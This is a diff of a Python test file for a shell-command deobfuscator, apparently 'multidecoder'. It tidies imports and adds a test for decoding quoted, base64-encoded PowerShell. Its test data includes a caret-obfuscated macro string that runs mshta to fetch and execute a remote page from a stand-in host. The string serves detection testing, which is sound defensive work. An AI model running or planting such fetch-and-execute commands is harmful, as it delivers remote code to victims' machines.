@@ -1,8 +1,12 @@
 import regex as re
-
-from multidecoder.analyzers.shell import CMD_RE
-from multidecoder.analyzers.shell import find_cmd_strings, find_powershell_strings
-from multidecoder.analyzers.shell import get_cmd_command, get_powershell_command, strip_carets
+from multidecoder.analyzers.shell import (
+    CMD_RE,
+    find_cmd_strings,
+    find_powershell_strings,
+    get_cmd_command,
+    get_powershell_command,
+    strip_carets,
+)
 from multidecoder.hit import Hit
 
 test = b'SET.NAME(a , cmd /c m^sh^t^a h^tt^p^:/^/some.url/x.html)'
@@ -89,6 +93,15 @@ def test_find_powershell_strings_enc():
     assert find_powershell_strings(ex) == [
         Hit(value=b'powershell -Command echo bee',
             obfuscation='unescape.shell.carets/>powershell.base64',
+            start=0,
+            end=len(ex))
+    ]
+
+def test_find_powershell_strings_enc_with_quotes():
+    ex = b'powershell /e "ZQBjAGgAbwAgAGIAZQBlAA=="'
+    assert find_powershell_strings(ex) == [
+        Hit(value=b'powershell -Command echo bee',
+            obfuscation='powershell.base64',
             start=0,
             end=len(ex))
     ]
